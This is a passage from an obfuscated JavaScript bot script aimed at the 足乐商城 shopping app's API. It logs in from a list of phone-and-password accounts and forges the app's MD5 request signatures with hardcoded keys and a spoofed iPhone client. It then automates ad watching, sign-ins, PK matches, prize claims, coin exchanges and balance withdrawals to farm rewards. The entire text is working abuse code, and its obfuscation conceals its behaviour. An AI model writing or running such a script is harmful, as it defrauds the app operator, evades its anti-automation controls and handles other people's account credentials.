_0x320ee0=0x0;_0x320ee0<arrs[_0x1d45d4(0x1cc,'q@Jw')][_0x20cd4b(0x1bb)];_0x320ee0++){xabs=zlsjhArr[_0x320ee0],phone=xabs['split']('#')[0x0],password=xabs[_0x20cd4b(0x2ba)]('#')[0x1],$['index']=_0x320ee0+0x1,console[_0x20cd4b(0x299)](_0x2e834a(0x2b0)+$[_0x20cd4b(0x230)]+'】'),await zldl();}else for(let _0x2d9435=0x0;_0x2d9435<zlsjhArr[_0x1d45d4(0x1c8,'TDHg')];_0x2d9435++){xabs=zlsjhArr[_0x2d9435],phone=xabs['split']('#')[0x0],password=xabs['split']('#')[0x1],$['index']=_0x2d9435+0x1,console['log']('\x0a开始【足乐商城'+$[_0x20cd4b(0x230)]+'】'),await zldl();}}destroyVM(global['vm']);})()['catch'](_0x19d775=>$['logErr'](_0x19d775))['finally'](()=>$[_0x4ecbe2(0x1b7)]());function stringToBase64(_0x25058d){const _0x37ad26=_0x23efcb,_0x3ed2b1=_0x4ecbe2;var _0x45dfbd=Buffer[_0x3ed2b1(0x2c8)](_0x25058d)[_0x37ad26(0x1fc,'brj%')](_0x37ad26(0x2db,'1RFV'));return _0x45dfbd;}function zldl(_0x42adbb='',_0x3e0611='',_0x2501e3=0x0){const _0x3d938c=_0x4ecbe2,_0x5cac0d=_0x23efcb,_0x413ca0=_0x1b9b51;let _0x440c5d=parseInt(Date['parse'](new Date())/0x3e8),_0x406fb7=MD5(_0x440c5d),_0x4e3d40=MD5Encrypt(_0x440c5d+_0x413ca0(0x279)+key+'client_tag--cRB7qed2q80tLWhKRq78fIusFBEaWWeeR5LMu8V9izyEzEqEfozvXCmQBvk45ePZtw8M784GFhJe\x0aFYBlbBl190tpTheXtI9babVRFlueO5KAmrrrjN7K5e+EkKrbv5wsnLBx4ZR+JUKY7mhLpkVVXqKu\x0anb28hr8jF+noO+DncuwNMfl4cVlscKku9U7ZFVy5'+key+key+_0x5cac0d(0x2da,'cP&L')+key+key+_0x3d938c(0x1ff)+password+key+key+_0x5cac0d(0x2e4,'m5@@')+phone+key+key+_0x5cac0d(0x2b4,'brj%')+_0x406fb7+key)[_0x5cac0d(0x2f8,'pEer')]();return _0x440c5d=_0x3e0611?_0x3e0611:_0x440c5d,_0x4e3d40=_0x42adbb?_0x42adbb:_0x4e3d40,new Promise(_0x4abc70=>{const _0x5dd29e=_0x413ca0,_0xe30c25=_0x5cac0d,_0x1c7dea=_0x3d938c;let _0xd90586={'url':_0x1c7dea(0x30d),'headers':JSON[_0xe30c25(0x218,'DG6&')](_0xe30c25(0x27b,'iUsO')+_0x440c5d+_0xe30c25(0x2e3,'pgwy')+_0x4e3d40+_0x1c7dea(0x30a)),'body':_0x5dd29e(0x1f7)+password+_0x5dd29e(0x23e)+phone+_0xe30c25(0x200,'li%x')+_0x406fb7+_0xe30c25(0x219,'#3][')};$[_0x1c7dea(0x2f3)](_0xd90586,async(_0x3bb824,_0x50de71,_0x5a1142)=>{const _0x306124=_0x1c7dea,_0x1ec873=_0xe30c25,_0x2482fb=_0x5dd29e;try{const _0x3a09b6=JSON[_0x2482fb(0x2e8)](_0x5a1142);_0x3a09b6[_0x2482fb(0x24c)]==0x1f4&&_0x3a09b6[_0x2482fb(0x26e)]&&(await $[_0x2482fb(0x260)](0x1f4),await zldl(_0x3a09b6[_0x1ec873(0x302,'gtdU')],_0x440c5d));if(_0x3a09b6[_0x2482fb(0x24c)]==0xc8){cookie=_0x50de71[_0x1ec873(0x20d,'mQXD')][_0x1ec873(0x21e,'li%x')]['join'](';')+';',token=_0x3a09b6[_0x1ec873(0x2e0,'Ht0y')][_0x2482fb(0x249)],console[_0x306124(0x25a)]('登陆成功'),pk='';do{await watchAdsToIncreasePkTimes(),await $['wait'](0x1f4);}while(pk!=_0x1ec873(0x1b3,'YpY)'));pk='';do{await memberMatchV3(),await $[_0x2482fb(0x260)](0x1f4);}while(pk!=_0x2482fb(0x284));await sphb(),await $[_0x1ec873(0x20c,'juWu')](0x1f4),await sprw(),await $['wait'](0x1f4),await newSignIn(),await $[_0x306124(0x310)](0x1f4),await freeFlops(),await $[_0x1ec873(0x1fd,'*^7j')](0x1f4),await prizeGet(),await $[_0x306124(0x310)](0x1f4),await exchangeExperiencePotion(),await $[_0x2482fb(0x260)](0x1f4),await myClub(),await $[_0x2482fb(0x260)](0x1f4),await goldCoinExchange(),await $[_0x306124(0x310)](0x1f4),await homeBubbleRewardInformation(),await infos();}else console[_0x1ec873(0x2bb,'*%ht')](_0x2482fb(0x331));}catch(_0x43b5d4){}finally{_0x4abc70();}},_0x2501e3);});}function infos(_0x9b5951='',_0x247f07='',_0xb58a19=0x0){return new Promise(_0x323400=>{const _0x2637e8=_0x364d,_0x28c6ae=_0x4740,_0x2972cd=_0x5f0f;let _0x571c76=parseInt(Date[_0x2972cd(0x1de)](new Date())/0x3e8),_0x3d387f=MD5Encrypt(_0x571c76+_0x28c6ae(0x222)+key+'--'+key)[_0x2972cd(0x1bc)]();_0x571c76=_0x247f07?_0x247f07:_0x571c76,_0x3d387f=_0x9b5951?_0x9b5951:_0x3d387f;let _0x161013={'url':_0x2972cd(0x20e),'headers':{'Host':_0x2972cd(0x2f2),'version':'v3','plat':'1','Authorization':_0x28c6ae(0x1fe)+token,'X-Requested-With':_0x28c6ae(0x296),'Accept-Language':_0x2972cd(0x1ec),'Accept-Encoding':_0x2972cd(0x1f1),'Accept':_0x2972cd(0x1b4),'Yw-Number':_0x28c6ae(0x305),'User-Agent':_0x2637e8(0x25f,'cP&L'),'Content-Length':'0','Yw-Sign':_0x3d387f,'Connection':_0x28c6ae(0x2a9),'Yw-Time':_0x571c76,'Cookie':cookie,'sign':_0x2637e8(0x282,'tl0v')}};$['get'](_0x161013,async(_0x32b87e,_0x545281,_0x59bf36)=>{const _0x236a2b=_0x2972cd,_0x393d76=_0x28c6ae,_0x50b997=_0x2637e8;try{const _0x181565=JSON['parse'](_0x59bf36);_0x181565['code']==0x1f4&&_0x181565[_0x50b997(0x202,'OXjw')]&&(await $[_0x393d76(0x260)](0x1f4),await infos(_0x181565['data'],_0x571c76)),_0x181565[_0x236a2b(0x1ef)]==0xc8&&(console['log']('个人资产：余额：'+_0x181565[_0x236a2b(0x2ed)][_0x393d76(0x1be)]+_0x393d76(0x2d9)+_0x181565[_0x50b997(0x325,'(2H#')]['gold_coins']),await balanceWithdrawApply()),_0x181565[_0x236a2b(0x1ef)]==0x1f4&&_0x181565['data']==null&&console[_0x50b997(0x328,'@IX2')](_0x50b997(0x32a,'1]Hw'),_0x181565[_0x236a2b(0x201)]);}catch(_0x19e52c){}finally{_0x323400();}},_0xb58a19);});}function sphb(_0x42583f='',_0x245e55='',_0x5aea4d=0x0){return new Promise(_0x56894b=>{const _0x509a7a=_0x364d,_0x1c8215=_0x5f0f,_0x4ee7f4=_0x4740;let _0x923e0f=parseInt(Date['parse'](new Date())/0x3e8),_0x2a006e=MD5Encrypt(_0x923e0f+_0x4ee7f4(0x222)+key+'--'+key)['toUpperCase']();_0x923e0f=_0x245e55?_0x245e55:_0x923e0f,_0x2a006e=_0x42583f?_0x42583f:_0x2a006e;let _0x1c4e9a={'url':_0x1c8215(0x2bd),'headers':{'Host':_0x1c8215(0x2f2),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':_0x4ee7f4(0x296),'Accept-Language':_0x4ee7f4(0x23b),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':_0x4ee7f4(0x226),'Yw-Number':_0x4ee7f4(0x305),'User-Agent':_0x4ee7f4(0x220),'Content-Length':'0','Yw-Sign':_0x2a006e,'Connection':_0x509a7a(0x1c5,'V)(v'),'Yw-Time':_0x923e0f,'Cookie':cookie,'sign':_0x1c8215(0x28e)}};$[_0x4ee7f4(0x21d)](_0x1c4e9a,async(_0x46ff33,_0x54a1d1,_0x5cb666)=>{const _0x38128a=_0x1c8215,_0x5548ea=_0x509a7a,_0x2d8ee2=_0x4ee7f4;try{const _0x2d303e=JSON['parse'](_0x5cb666);_0x2d303e[_0x2d8ee2(0x24c)]==0x1f4&&_0x2d303e[_0x2d8ee2(0x26e)]&&(await $[_0x5548ea(0x2df,'!4a)')](0x1f4),await sphb(_0x2d303e['data'],_0x923e0f)),_0x2d303e[_0x2d8ee2(0x24c)]==0xc8&&console['log'](_0x38128a(0x2f9)+_0x2d303e['data'][_0x2d8ee2(0x22f)]+_0x2d303e['data']['name']),_0x2d303e[_0x5548ea(0x20b,'q@Jw')]==0x1f4&&_0x2d303e[_0x38128a(0x2ed)]==null&&console[_0x38128a(0x25a)](_0x5548ea(0x2ef,'mQXD'),_0x2d303e[_0x2d8ee2(0x315)]);}catch(_0x11c609){}finally{_0x56894b();}},_0x5aea4d);});}function goldCoinExchange(_0x35bd75='',_0x3a0788='',_0x12ed01=0x0){return new Promise(_0x45c37c=>{const _0x52cba9=_0x5f0f,_0x595fff=_0x364d,_0x1d07e6=_0x4740;let _0x1d6c8d=parseInt(Date['parse'](new Date())/0x3e8),_0x102d09=MD5Encrypt(_0x1d6c8d+'--10470706--'+key+'--'+key)[_0x1d07e6(0x31c)]();_0x1d6c8d=_0x3a0788?_0x3a0788:_0x1d6c8d,_0x102d09=_0x35bd75?_0x35bd75:_0x102d09;let _0x51b5cb={'url':_0x595fff(0x308,'bsY@'),'headers':{'Host':_0x1d07e6(0x2e6),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':_0x52cba9(0x2b5),'Accept-Language':_0x1d07e6(0x23b),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':_0x595fff(0x210,'*%ht'),'Yw-Number':_0x52cba9(0x323),'User-Agent':_0x595fff(0x204,'li%x'),'Content-Length':'0','Yw-Sign':_0x102d09,'Connection':_0x595fff(0x1c1,'m5@@'),'Yw-Time':_0x1d6c8d,'Cookie':cookie,'sign':_0x52cba9(0x28e)}};$[_0x1d07e6(0x21d)](_0x51b5cb,async(_0x2f21c3,_0x5d75d5,_0x18490a)=>{const _0x29c2d1=_0x52cba9,_0x46317d=_0x1d07e6,_0x21236a=_0x595fff;try{const _0x8f6583=JSON[_0x21236a(0x1c6,'TDHg')](_0x18490a);_0x8f6583[_0x21236a(0x2c9,'li%x')]==0x1f4&&_0x8f6583[_0x46317d(0x26e)]&&(await $[_0x29c2d1(0x310)](0x1f4),await goldCoinExchange(_0x8f6583[_0x29c2d1(0x2ed)],_0x1d6c8d)),_0x8f6583['code']==0xc8&&console[_0x46317d(0x299)]('金币兑换：',_0x8f6583[_0x46317d(0x315)]),_0x8f6583[_0x29c2d1(0x1ef)]==0x1f4&&_0x8f6583[_0x29c2d1(0x2ed)]==null&&console[_0x46317d(0x299)](_0x21236a(0x297,'@IX2'),_0x8f6583[_0x46317d(0x315)]);}catch(_0x26ad79){}finally{_0x45c37c();}},_0x12ed01);});}function newSignIn(_0x4fe762='',_0xf6dcd4='',_0x9aecab=0x0){return new Promise(_0x34a876=>{const _0x2d5385=_0x364d,_0xb5ab22=_0x4740,_0x1fc42a=_0x5f0f;let _0x541f22=parseInt(Date['parse'](new Date())/0x3e8),_0x596b23=MD5Encrypt(_0x541f22+_0x1fc42a(0x21b)+key+'--'+key)[_0xb5ab22(0x31c)]();_0x541f22=_0xf6dcd4?_0xf6dcd4:_0x541f22,_0x596b23=_0x4fe762?_0x4fe762:_0x596b23;let _0x867f13={'url':_0x2d5385(0x276,'!sIE'),'headers':{'Host':'app.sjdhwu.com','version':'v3','plat':'1','Authorization':_0xb5ab22(0x1fe)+token,'X-Requested-With':_0x1fc42a(0x2b5),'Accept-Language':_0x1fc42a(0x1ec),'Accept-Encoding':_0x1fc42a(0x1f1),'Accept':_0xb5ab22(0x226),'Yw-Number':'10470706','User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Length':'0','Yw-Sign':_0x596b23,'Connection':_0xb5ab22(0x2a9),'Yw-Time':_0x541f22,'Cookie':cookie,'sign':'1234567890'}};$[_0xb5ab22(0x21d)](_0x867f13,async(_0x5d2982,_0x53d460,_0x3331e0)=>{const _0x367767=_0x1fc42a,_0x3072ab=_0xb5ab22,_0x594129=_0x2d5385;try{const _0x4f0134=JSON[_0x594129(0x255,'tl0v')](_0x3331e0);_0x4f0134['code']==0x1f4&&_0x4f0134[_0x594129(0x211,'m5@@')]&&(await $[_0x3072ab(0x260)](0x1f4),await newSignIn(_0x4f0134[_0x367767(0x2ed)],_0x541f22)),_0x4f0134[_0x594129(0x2dc,'DgEQ')]==0xc8&&console[_0x3072ab(0x299)](_0x594129(0x22d,'TDHg')+_0x4f0134['data'][_0x367767(0x23f)]+_0x4f0134['data'][_0x3072ab(0x25c)]),_0x4f0134[_0x594129(0x1dd,'UL&h')]==0x1f4&&_0x4f0134[_0x367767(0x2ed)]==null&&(console[_0x367767(0x25a)]('签到：',_0x4f0134['message']),_0x4f0134['message']==_0x594129(0x2a3,'S#5w')&&(await $['wait'](0x3c8c),await newSignIn()));}catch(_0x31248c){}finally{_0x34a876();}},_0x9aecab);});}function sprw(_0x2d78ed='',_0x4af397='',_0x9b3c10=0x0){return new Promise(_0x11906d=>{const _0x30543b=_0x364d,_0x2b4277=_0x4740,_0x88f13e=_0x5f0f;let _0x35b3b8=parseInt(Date['parse'](new Date())/0x3e8),_0x1ccdc1=MD5Encrypt(_0x35b3b8+_0x88f13e(0x21b)+key+'--'+key)[_0x2b4277(0x31c)]();_0x35b3b8=_0x4af397?_0x4af397:_0x35b3b8,_0x1ccdc1=_0x2d78ed?_0x2d78ed:_0x1ccdc1;let _0x166b58={'url':'https://app.sjdhwu.com/yw_api/v3/watchAd','headers':{'Host':'app.sjdhwu.com','version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':_0x2b4277(0x296),'Accept-Language':_0x2b4277(0x23b),'Accept-Encoding':_0x2b4277(0x2ae),'Accept':_0x2b4277(0x226),'Yw-Number':'10470706','User-Agent':_0x30543b(0x1ed,'qNuk'),'Content-Length':'0','Yw-Sign':_0x1ccdc1,'Connection':_0x88f13e(0x1cb),'Yw-Time':_0x35b3b8,'Cookie':cookie,'sign':'1234567890'}};$[_0x88f13e(0x2f3)](_0x166b58,async(_0x53c82e,_0x188070,_0x40f016)=>{const _0x5792c4=_0x2b4277,_0x312bca=_0x30543b,_0x289919=_0x88f13e;try{const _0x40a38c=JSON[_0x289919(0x1de)](_0x40f016);_0x40a38c[_0x312bca(0x2d3,'#k73')]==0x1f4&&_0x40a38c[_0x312bca(0x1e5,'UL&h')]&&(await $[_0x312bca(0x252,'68k1')](0x1f4),await sprw(_0x40a38c[_0x289919(0x2ed)],_0x35b3b8)),_0x40a38c[_0x312bca(0x2c9,'li%x')]==0xc8&&console[_0x5792c4(0x299)](_0x289919(0x2d8),_0x40a38c['message']),_0x40a38c['code']==0x1f4&&_0x40a38c['data']==null&&(console[_0x312bca(0x2b7,'tKzs')](_0x312bca(0x1da,'FBs1'),_0x40a38c[_0x5792c4(0x315)]),_0x40a38c[_0x312bca(0x1ee,'UL&h')]==_0x312bca(0x225,'#3][')&&(await $[_0x5792c4(0x260)](0x3c8c),await sprw()));}catch(_0x53ba36){}finally{_0x11906d();}},_0x9b3c10);});}function watchAdsToIncreasePkTimes(_0x4c621c='',_0x2697a6='',_0x222694=0x0){return new Promise(_0x4f096b=>{const _0x553bb6=_0x4740,_0x530258=_0x5f0f,_0x345cdf=_0x364d;let _0x2a85fc=parseInt(Date[_0x345cdf(0x2d0,'juWu')](new Date())/0x3e8),_0x1e1844=MD5Encrypt(_0x2a85fc+_0x530258(0x21b)+key+'--'+key)[_0x530258(0x1bc)]();_0x2a85fc=_0x2697a6?_0x2697a6:_0x2a85fc,_0x1e1844=_0x4c621c?_0x4c621c:_0x1e1844;let _0x4c843={'url':_0x530258(0x27a),'headers':{'Host':'app.sjdhwu.com','version':'v3','plat':'1','Authorization':_0x345cdf(0x2ac,'S#5w')+token,'X-Requested-With':_0x530258(0x2b5),'Accept-Language':'zh-Hans-US;q=1,\x20zh-Hant-HK;q=0.9','Accept-Encoding':_0x345cdf(0x27c,'68k1'),'Accept':'*/*','Yw-Number':_0x345cdf(0x2f7,'tKzs'),'User-Agent':_0x345cdf(0x2ea,'o]UK'),'Content-Length':'0','Yw-Sign':_0x1e1844,'Connection':_0x345cdf(0x209,'pgwy'),'Yw-Time':_0x2a85fc,'Cookie':cookie,'sign':'1234567890','ymavi':_0x553bb6(0x257)}};$[_0x553bb6(0x21d)](_0x4c843,async(_0x2b9333,_0x491b50,_0x470986)=>{const _0x407218=_0x345cdf,_0x3fd5ac=_0x553bb6,_0x52c72f=_0x530258;try{const _0xbfe718=JSON[_0x52c72f(0x1de)](_0x470986);_0xbfe718['code']==0x1f4&&_0xbfe718[_0x52c72f(0x2ed)]&&(await $[_0x52c72f(0x310)](0x1f4),await watchAdsToIncreasePkTimes(_0xbfe718['data'],_0x2a85fc)),_0xbfe718[_0x3fd5ac(0x24c)]==0xc8&&(await $['wait'](0x1f4),await memberMatchV3()),_0xbfe718[_0x52c72f(0x1ef)]==0x1f4&&_0xbfe718[_0x407218(0x267,'li%x')]==null&&(console[_0x407218(0x1d5,'i!73')](_0x407218(0x24f,'m5@@'),_0xbfe718[_0x3fd5ac(0x315)]),pk=_0xbfe718['message'],_0xbfe718[_0x52c72f(0x201)]==_0x3fd5ac(0x289)&&await $['wait'](0x3c8c));}catch(_0x2eac6f){}finally{_0x4f096b();}},_0x222694);});}function memberMatchV3(_0x1816df='',_0x2691cd='',_0x518fd0=0x0){return new Promise(_0x487cbc=>{const _0xda6106=_0x4740,_0x16e603=_0x364d,_0x57e6cc=_0x5f0f;let _0x4f7f3a=parseInt(Date[_0x57e6cc(0x1de)](new Date())/0x3e8),_0x53ca57=MD5Encrypt(_0x4f7f3a+_0x57e6cc(0x21b)+key+'--'+key)[_0x16e603(0x250,'OXjw')]();_0x4f7f3a=_0x2691cd?_0x2691cd:_0x4f7f3a,_0x53ca57=_0x1816df?_0x1816df:_0x53ca57;let _0x4d0269={'url':_0x57e6cc(0x2c5),'headers':{'Host':_0xda6106(0x2e6),'version':'v3','plat':'1','Authorization':_0x16e603(0x1b9,'*^7j')+token,'X-Requested-With':_0x57e6cc(0x2b5),'Accept-Language':_0x57e6cc(0x1ec),'Accept-Encoding':'gzip,\x20deflate,\x20br','Accept':_0x57e6cc(0x1b4),'Yw-Number':_0x16e603(0x2fd,'Ht0y'),'User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Length':'0','Yw-Sign':_0x53ca57,'Connection':_0x57e6cc(0x1cb),'Yw-Time':_0x4f7f3a,'Cookie':cookie,'sign':'1234567890'}};$[_0xda6106(0x21d)](_0x4d0269,async(_0x5b0ccf,_0x28d4ce,_0x2b9bce)=>{const _0x2023bb=_0x16e603,_0x252bcd=_0xda6106,_0x22e1ec=_0x57e6cc;try{const _0x3fa755=JSON[_0x22e1ec(0x1de)](_0x2b9bce);_0x3fa755[_0x252bcd(0x24c)]==0x1f4&&_0x3fa755[_0x252bcd(0x26e)]&&(await $[_0x22e1ec(0x310)](0x1f4),await memberMatchV3(_0x3fa755[_0x2023bb(0x287,'wmA4')],_0x4f7f3a)),_0x3fa755['code']==0xc8&&(await $[_0x2023bb(0x333,'DgEQ')](0x1f4),await matchInformationV3()),_0x3fa755[_0x252bcd(0x24c)]==0x1f4&&_0x3fa755['data']==null&&console[_0x252bcd(0x299)]('获取PK失败：',_0x3fa755[_0x22e1ec(0x201)]);}catch(_0xc08160){}finally{_0x487cbc();}},_0x518fd0);});}function memberMatchV3(_0x3e9195='',_0x287995='',_0x1f7418=0x0){return new Promise(_0x40a635=>{const _0x562c45=_0x364d,_0xb5dcef=_0x5f0f,_0x30fcdb=_0x4740;let _0x339698=parseInt(Date[_0x30fcdb(0x2e8)](new Date())/0x3e8),_0x221eea=MD5Encrypt(_0x339698+'--10470706--'+key+'--'+key)[_0x30fcdb(0x31c)]();_0x339698=_0x287995?_0x287995:_0x339698,_0x221eea=_0x3e9195?_0x3e9195:_0x221eea;let _0x2699d3={'url':_0xb5dcef(0x2c5),'headers':{'Host':_0xb5dcef(0x2f2),'version':'v3','plat':'1','Authorization':_0x562c45(0x2e1,'#3][')+token,'X-Requested-With':_0x562c45(0x2c7,'UL&h'),'Accept-Language':'zh-Hans-US;q=1,\x20zh-Hant-HK;q=0.9','Accept-Encoding':_0xb5dcef(0x1f1),'Accept':_0xb5dcef(0x1b4),'Yw-Number':_0x562c45(0x1ca,'pEer'),'User-Agent':_0x562c45(0x2ce,'bsY@'),'Content-Length':'0','Yw-Sign':_0x221eea,'Connection':'keep-alive','Yw-Time':_0x339698,'Cookie':cookie,'sign':_0x562c45(0x247,'&SeV')}};$[_0xb5dcef(0x2f3)](_0x2699d3,async(_0x4fa207,_0x38a96c,_0xf319e)=>{const _0x323024=_0x562c45,_0x4b2755=_0xb5dcef,_0x2af9a5=_0x30fcdb;try{const _0x58a96e=JSON[_0x2af9a5(0x2e8)](_0xf319e);_0x58a96e[_0x4b2755(0x1ef)]==0x1f4&&_0x58a96e[_0x4b2755(0x2ed)]&&(await $[_0x323024(0x2c4,'S#5w')](0x1f4),await memberMatchV3(_0x58a96e[_0x2af9a5(0x26e)],_0x339698)),_0x58a96e['code']==0xc8&&(await $[_0x323024(0x304,'Ht0y')](0x1f4),await matchInformationV3()),_0x58a96e[_0x4b2755(0x1ef)]==0x1f4&&_0x58a96e[_0x4b2755(0x2ed)]==null&&(console[_0x4b2755(0x25a)](_0x4b2755(0x2ee),_0x58a96e['message']),pk=_0x58a96e[_0x2af9a5(0x315)]);}catch(_0x5a8d1e){}finally{_0x40a635();}},_0x1f7418);});}function matchInformationV3(_0x2d6dd3='',_0x4e4106='',_0x35a202=0x0){return new Promise(_0x433032=>{const _0x309414=_0x364d,_0x412b1f=_0x5f0f,_0xcf3289=_0x4740;let _0x1f1f94=parseInt(Date[_0xcf3289(0x2e8)](new Date())/0x3e8),_0x312f86=MD5Encrypt(_0x1f1f94+_0x412b1f(0x21b)+key+'--'+key)[_0xcf3289(0x31c)]();_0x1f1f94=_0x4e4106?_0x4e4106:_0x1f1f94,_0x312f86=_0x2d6dd3?_0x2d6dd3:_0x312f86;let _0x1cfc76={'url':_0x309414(0x292,'gtdU'),'headers':{'Host':_0x309414(0x1ce,'68k1'),'version':'v3','plat':'1','Authorization':_0xcf3289(0x1fe)+token,'X-Requested-With':_0x309414(0x246,'!sIE'),'Accept-Language':'zh-Hans-US;q=1,\x20zh-Hant-HK;q=0.9','Accept-Encoding':_0x309414(0x240,'(2H#'),'Accept':_0x412b1f(0x1b4),'Yw-Number':_0xcf3289(0x305),'User-Agent':_0x309414(0x28a,'68k1'),'Content-Length':'0','Yw-Sign':_0x312f86,'Connection':_0x309414(0x29f,'!4a)'),'Yw-Time':_0x1f1f94,'Cookie':cookie,'sign':'1234567890'}};$[_0x412b1f(0x2d5)](_0x1cfc76,async(_0x1637e1,_0x59c102,_0x1584e8)=>{const _0x2de7a7=_0x412b1f,_0x830f45=_0xcf3289,_0x1baf48=_0x309414;try{const _0x5b00c2=JSON[_0x1baf48(0x2b3,'#3][')](_0x1584e8);_0x5b00c2[_0x1baf48(0x31b,'qNuk')]==0x1f4&&_0x5b00c2[_0x830f45(0x26e)]&&(await $['wait'](0x1f4),await matchInformationV3(_0x5b00c2['data'],_0x1f1f94));if(_0x5b00c2['code']==0xc8){console[_0x1baf48(0x2d7,'pEer')](_0x1baf48(0x2ca,'tKzs'));let _0x36bcc4=_0x5b00c2[_0x830f45(0x26e)];for(let _0x2eb519 of _0x36bcc4){await emberPk(_0x2eb519['id']),await $['wait'](0x12c);}}_0x5b00c2[_0x1baf48(0x21f,'cP&L')]==0x1f4&&_0x5b00c2[_0x1baf48(0x2ad,'1]Hw')]==null&&console[_0x2de7a7(0x25a)](_0x2de7a7(0x241),_0x5b00c2[_0x1baf48(0x217,'FBs1')]);}catch(_0x1a70bf){}finally{_0x433032();}},_0x35a202);});}function emberPk(_0x5577f1,_0x2953a2='',_0x392565='',_0x2da0af=0x0){return new Promise(_0x1cfe72=>{const _0x25e441=_0x5f0f,_0x5db425=_0x4740,_0x1b27d3=_0x364d;let _0x3c34f0=parseInt(Date['parse'](new Date())/0x3e8),_0x3c6d5c=MD5Encrypt(_0x3c34f0+_0x1b27d3(0x2c0,'vWZr')+key+_0x5db425(0x32e)+_0x5577f1+key)[_0x1b27d3(0x250,'OXjw')]();_0x3c34f0=_0x392565?_0x392565:_0x3c34f0,_0x3c6d5c=_0x2953a2?_0x2953a2:_0x3c6d5c;let _0x32aa22={'url':_0x25e441(0x23c),'headers':{'Host':_0x5db425(0x2e6),'Authorization':_0x5db425(0x1fe)+token,'Sign':_0x5db425(0x1f9),'Yw-Time':_0x3c34f0,'Yw-Number':_0x1b27d3(0x301,'tl0v'),'Channel':'1','Versions':'333','Version-Number':_0x1b27d3(0x243,'m$&r'),'Plat':'2','Yw-Sign':_0x3c6d5c,'Content-Type':_0x25e441(0x2ec),'Accept-Encoding':'gzip','User-Agent':_0x1b27d3(0x2cf,'tl0v')},'body':'match_id='+_0x5577f1};$[_0x1b27d3(0x1fa,'YpY)')](_0x32aa22,async(_0x4bd0f3,_0x13571c,_0x4f8a6a)=>{const _0x128bea=_0x5db425,_0x2b88d4=_0x25e441,_0x229ab8=_0x1b27d3;try{const _0x4612fa=JSON[_0x229ab8(0x1c9,'wmA4')](_0x4f8a6a);_0x4612fa['code']==0x1f4&&_0x4612fa[_0x2b88d4(0x2ed)]&&(await $[_0x2b88d4(0x310)](0x1f4),await emberPk(_0x5577f1,_0x4612fa[_0x2b88d4(0x2ed)],_0x3c34f0)),_0x4612fa[_0x128bea(0x24c)]==0xc8&&console[_0x2b88d4(0x25a)](_0x2b88d4(0x277)+_0x5577f1+_0x128bea(0x1f2)+_0x4612fa[_0x128bea(0x26e)][_0x229ab8(0x207,'B4JJ')][0x0][_0x229ab8(0x270,'tl0v')]+'金币'),_0x4612fa[_0x229ab8(0x1bf,'7C8w')]==0x1f4&&_0x4612fa['data']==null&&console[_0x128bea(0x299)](_0x128bea(0x24b),_0x4612fa[_0x128bea(0x315)]);}catch(_0x331cda){}finally{_0x1cfe72();}},_0x2da0af);});}function exchangeExperiencePotion(_0x15f177='',_0x2cd977='',_0x1425d3='',_0x4fdce0=0x0){return new Promise(_0x2c2d23=>{const _0x28f190=_0x364d,_0x25ecbf=_0x4740,_0x1d2a5b=_0x5f0f;let _0x555c43=parseInt(Date['parse'](new Date())/0x3e8),_0x368b55=MD5Encrypt(_0x555c43+_0x1d2a5b(0x21b)+key+'--'+key)[_0x25ecbf(0x31c)]();_0x555c43=_0x1425d3?_0x1425d3:_0x555c43,_0x368b55=_0x2cd977?_0x2cd977:_0x368b55;let _0x50a6cb={'url':'https://app.sjdhwu.com/yw_api/v3/exchangeExperiencePotion','headers':{'Host':_0x1d2a5b(0x2f2),'version':'v3','plat':'1','Authorization':'Bearer\x20'+token,'X-Requested-With':_0x28f190(0x321,'JgR$'),'Accept-Language':_0x28f190(0x293,'*^7j'),'Accept-Encoding':_0x1d2a5b(0x1f1),'Accept':'*/*','Yw-Number':_0x1d2a5b(0x323),'User-Agent':'LShopMallProApp/3.1.5\x20(iPhone;\x20iOS\x2014.2;\x20Scale/2.00)','Content-Type':'application/json','Yw-Sign':_0x368b55,'Connection':_0x1d2a5b(0x1cb),'Yw-Time':_0x555c43,'Cookie':cookie,'sign':_0x28f190(0x2eb,'o]UK')},'body':_0x28f190(0x223,'V)(v')};$[_0x25ecbf(0x21d)](_0x50a6cb,async(_0x51ca38,_0x518ce4,_0x145c69)=>{const _0x346c14=_0x28f190,_0x3b19a3=_0x1d2a5b,_0x2b11ab=_0x25ecbf;try{const _0x1c584a=JSON['parse'](_0x145c69);_0x1c584a[_0x2b11ab(0x24c)]==0x1f4&&_0x1c584a[_0x3b19a3(0x2ed)]&&(await $['wait'](0x1f4),await exchangeExperiencePotion(_0x15f177,_0x1c584a[_0x346c14(0x1e5,'UL&h')],_0x555c43)),_0x1c584a[_0x346c14(0x244,'sg26')]==0xc8&&console[_0x346c14(0x208,'YpY)')](_0x2b11ab(0x314)),_0x1c584a['code']==0x1f4&&_0x1c584a[_0x2b11ab(0x26e)]==null&&console['log'](_0x2b11ab(0x281),_0x1c584a[_0x346c14(0x2c6,'Ht0y')]);}catch(_0x123d2f){}finally{_0x2c2d23();}},_0x4fdce0);});}function prizeGet(_0x25b917='',_0x1ffc0b='',_0x31cc6a=0x0){return new Promise(_0x4605b0=>{const _0x185778=_0x364d,_0x18d5fb=_0x4740,_0x5a464a=_0x5f0f;let _0x1011b3=parseInt(Date[_0x5a464a(0x1de)](new Date())/0x3e8),_0xe0b220=MD5Encrypt(_0x1011b3+_0x18d5fb(0x222)+key+'--'+key)[_0x5a464a(0x1bc)]();_0x1011b3=_0x1ffc0b?_0x1ffc0b:_0x1011b3,_0xe0b220=_0x25b917?_0x25b917:_0xe0b220;let 